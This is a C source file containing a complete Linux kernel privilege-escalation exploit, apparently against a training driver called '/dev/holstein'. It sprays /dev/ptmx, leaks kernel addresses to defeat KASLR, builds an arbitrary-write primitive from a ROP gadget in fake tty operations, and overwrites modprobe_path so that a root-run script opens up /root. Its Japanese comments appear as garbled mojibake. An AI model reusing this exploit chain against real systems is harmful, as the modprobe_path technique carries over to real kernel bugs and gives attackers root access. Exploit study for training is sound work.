#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <unistd.h>

#define ofs_tty_ops 0xc38880
#define addr_modprobe_path (kbase + 0xe38180)
#define rop_mov_prdx_rcx (kbase + 0x0477f7)

unsigned long kbase, g_buf;
unsigned long user_cs, user_ss, user_rsp, user_rflags;

void fatal(const char *msg) {
  perror(msg);
  exit(1);
}

int fd;
int spray[100];
char buf[0x500];

void AAW32(unsigned long addr, unsigned int val) {
  unsigned long *p = (unsigned long*)&buf;
  p[12] = rop_mov_prdx_rcx;
  *(unsigned long*)&buf[0x418] = g_buf;
  write(fd, buf, 0x420);

  // mov [rdx], rcx; ret;
  for (int i = 0; i < 100; i++) {
    ioctl(spray[i], val /* rcx */, addr /* rdx */);
  }
}

int main() {
  for (int i = 0; i < 50; i++) {
    spray[i] = open("/dev/ptmx", O_RDONLY | O_NOCTTY);
    if (spray[i] == -1)
      fatal("/dev/ptmx");
  }

  fd = open("/dev/holstein", O_RDWR);
  if (fd == -1)
    fatal("/dev/holstein");

  for (int i = 50; i < 100; i++) {
    spray[i] = open("/dev/ptmx", O_RDONLY | O_NOCTTY);
    if (spray[i] == -1)
      fatal("/dev/ptmx");
  }

  // KASLRã®å›žé¿
  read(fd, buf, 0x500);
  kbase = *(unsigned long*)&buf[0x418] - ofs_tty_ops;
  printf("[+] kbase = 0x%016lx\n", kbase);

  // g_bufã®ã‚¢ãƒ‰ãƒ¬ã‚¹ãƒªãƒ¼ã‚¯
  g_buf = *(unsigned long*)&buf[0x438] - 0x438;
  printf("[+] g_buf = 0x%016lx\n", g_buf);

  char cmd[] = "/tmp/evil.sh";
  for (int i = 0; i < sizeof(cmd); i += 4) {
    AAW32(addr_modprobe_path + i, *(unsigned int*)&cmd[i]);
  }

  system("echo -e '#!/bin/sh\nchmod -R 777 /root' > /tmp/evil.sh");
  system("chmod +x /tmp/evil.sh");
  system("echo -e '\xde\xad\xbe\xef' > /tmp/pwn");
  system("chmod +x /tmp/pwn");
  system("/tmp/pwn"); // modprobe_pathã®å‘¼ã³å‡ºã—

  return 0;
}